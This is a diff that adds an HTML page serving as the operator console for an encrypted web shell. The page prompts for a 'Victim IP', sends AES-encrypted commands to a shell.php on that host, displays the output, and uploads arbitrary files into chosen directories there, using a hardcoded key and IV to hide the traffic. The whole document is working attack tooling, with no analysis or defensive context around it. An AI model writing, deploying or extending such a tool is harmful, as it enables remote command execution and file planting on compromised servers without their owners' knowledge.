@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Web Shell & File Upload</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="file"] {
+            width: 300px;
+            padding: 5px;
+            margin-bottom: 10px;
+        }
+
+        button {
+            padding: 5px 10px;
+            margin-top: 5px;
+        }
+
+        pre,
+        .result {
+            display: block;
+            width: 90%;
+            background: #f0f0f0;
+            padding: 10px;
+            border: 1px solid #ccc;
+            overflow: auto;
+            white-space: pre-wrap;
+            margin-top: 10px;
+        }
+
+        pre {
+            height: 200px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <section>
+        <h1>Web Shell</h1>
+        <form id="webShellForm">
+            <input id="command" type="text" placeholder="Enter command..." autocomplete="off" required />
+            <button type="submit">Execute</button>
+            <pre id="resultExec"></pre>
+        </form>
+    </section>
+
+    <section>
+        <h1>Upload File</h1>
+        <form id="uploadForm">
+            <input id="directory" type="text" placeholder="Directory (optional)" autocomplete="off" />
+            <input id="fileInput" type="file" required />
+            <button type="submit">Upload</button>
+        </form>
+        <div id="resultUpload" class="result"></div>
+    </section>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"
+        integrity="sha512-a+SUDuwNzXDvz4XrIcXHuCf089/iJAoN4lmrXJg18XnduKK6YlDHNRalv4yd1N40OKI80tFidF+rqTFKGPoWFQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer">
+        </script>
+    <script>
+        const ip = prompt("Victim IP:");
+        const url = `http://${ip}:80/shell.php`;
+
+        const key = CryptoJS.enc.Hex.parse("780ffdcd9107448627a765e5f1a46c32");
+        const iv = CryptoJS.enc.Hex.parse("9911da82e6816dcd46acfe4c11c32f5d");
+
+        const encrypt = data =>
+            CryptoJS.AES.encrypt(data, key, { iv, mode: CryptoJS.mode.CBC }).toString();
+
+        const decrypt = ct =>
+            CryptoJS.AES.decrypt(ct, key, { iv, mode: CryptoJS.mode.CBC }).toString(CryptoJS.enc.Utf8);
+
+
+        async function readFileAsWordArray(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(CryptoJS.lib.WordArray.create(reader.result));
+                reader.onerror = reject;
+                reader.readAsArrayBuffer(file);
+            });
+        }
+
+        document.getElementById("webShellForm").addEventListener("submit", async e => {
+            e.preventDefault();
+            const cmd = document.getElementById("command").value.trim();
+            if (!cmd) return;
+            const res = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ encryptedCommand: encrypt(cmd) })
+            });
+            const { msg } = await res.json();
+            document.getElementById("resultExec").textContent = decrypt(msg);
+        });
+
+        document.getElementById("uploadForm").addEventListener("submit", async e => {
+            e.preventDefault();
+            const fileInput = document.getElementById("fileInput");
+            const file = fileInput.files[0];
+
+            const dir = document.getElementById("directory").value.trim();
+            const sep = dir.startsWith("/") ? "/" : "\\";
+            const path = dir ? `${dir}${sep}${file.name}` : file.name;
+
+            const dataWA = await readFileAsWordArray(file);
+            const encryptedFileName = encrypt(path);
+            const encryptedData = encrypt(dataWA);
+
+            const res = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ encryptedFileName, encryptedData })
+            });
+            const json = await res.json();
+            const msg = decrypt(json['msg']);
+
+            const out = document.getElementById("resultUpload");
+
+            if (msg !== "File uploaded successfully!" && msg !== "File upload failed. Please try again.") {
+                out.innerHTML = "";
+                out.innerHTML = `File uploaded: <a href="http://${ip}:80/${msg}" target="_blank">${msg}</a>`;
+            } else {
+                out.textContent = msg;
+            }
+        });
+    </script>
+
+
+</body>
+
+</html>
